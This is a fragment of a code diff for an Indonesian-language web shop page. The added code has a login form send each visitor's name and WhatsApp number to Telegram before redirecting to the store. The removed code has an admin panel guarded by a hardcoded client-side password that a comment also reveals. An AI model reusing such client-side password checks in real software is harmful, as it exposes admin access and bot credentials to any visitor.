-                // Kirim ke Telegram (async, tidak menghalangi render)
-                await sendToTelegram(name, phone);
-                renderStore();
+
+            const nama = document.getElementById('nama').value.trim();
+            const nomor = document.getElementById('nomor').value.trim();
+
+            if (!nama || !nomor) {
+                alert('Harap isi nama dan nomor WhatsApp!');
+                return;
+            }
+
+            // Tampilkan loading
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('submitBtn').disabled = true;
+
+            // Kirim ke Telegram
+            const berhasil = await sendToTelegram(nama, nomor);
+
+            if (berhasil) {
+                // Simpan data login (opsional, untuk digunakan di halaman store nanti)
+                localStorage.setItem('yanz_user', JSON.stringify({ nama, nomor }));
+
+                // Redirect ke halaman utama store (ganti dengan URL store Anda)
+                // Jika store di halaman yang sama, kita bisa tampilkan elemen store.
+                // Di sini kita asumsikan store berada di file terpisah atau kita bisa arahkan.
+                window.location.href = 'store.html'; // Ganti dengan halaman store Anda
+                // Jika ingin tetap di halaman ini dan menampilkan store, bisa pakai manipulasi DOM
+                // Tapi untuk sederhana, kita redirect.
+            } else {
+                alert('Gagal mengirim data. Coba lagi nanti.');
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('submitBtn').disabled = false;
             }
         });
-
-        document.getElementById('checkout-btn').addEventListener('click', () => {
-            if (Object.keys(cart).length === 0) return;
-            renderPayment();
-        });
-
-        document.getElementById('confirm-wa').addEventListener('click', () => {
-            const msg = buildWaMessage();
-            const waNumber = settings.adminWa.replace(/\D/g, '');
-            window.open(`https://wa.me/${waNumber}?text=${msg}`, '_blank');
-        });
-
-        document.getElementById('back-to-store').addEventListener('click', () => {
-            renderStore();
-        });
-
-        document.getElementById('save-settings').addEventListener('click', () => {
-            settings.adminWa = document.getElementById('admin-wa-input').value;
-            settings.dana = document.getElementById('admin-dana-input').value;
-            settings.gopay = document.getElementById('admin-gopay-input').value;
-            settings.telegramToken = document.getElementById('admin-telegram-token').value;
-            settings.telegramChatId = document.getElementById('admin-telegram-chatid').value;
-            saveSettings(); alert('Pengaturan tersimpan');
-        });
-
-        document.getElementById('save-products-admin').addEventListener('click', () => {
-            document.querySelectorAll('.admin-item').forEach(item => {
-                const id = item.dataset.id;
-                const prod = products.find(p => p.id === id);
-                if (prod) {
-                    prod.name = item.querySelector('.admin-prod-name').value;
-                    prod.price = parseInt(item.querySelector('.admin-prod-price').value) || 0;
-                    prod.description = item.querySelector('.admin-prod-desc').value;
-                }
-            });
-            saveProducts(); alert('Produk diperbarui'); renderAdmin();
-        });
-
-        document.getElementById('admin-logout').addEventListener('click', () => { renderStore(); });
-
-        document.getElementById('admin-link').addEventListener('click', () => {
-            const pwd = prompt('Masukkan password admin:');
-            if (pwd === 'yanzadmin1') renderAdmin(); else alert('Password salah');
-        });
-
-        // Inisialisasi
-        if (loggedInUser) renderStore(); else renderLoginScreen();
-    })();
-</script>
-<!-- >.JPG placeholder, admin password: yanzadmin1. Telegram token & chat id bisa diatur di panel admin -->
+    </script>
 </body>
 </html>
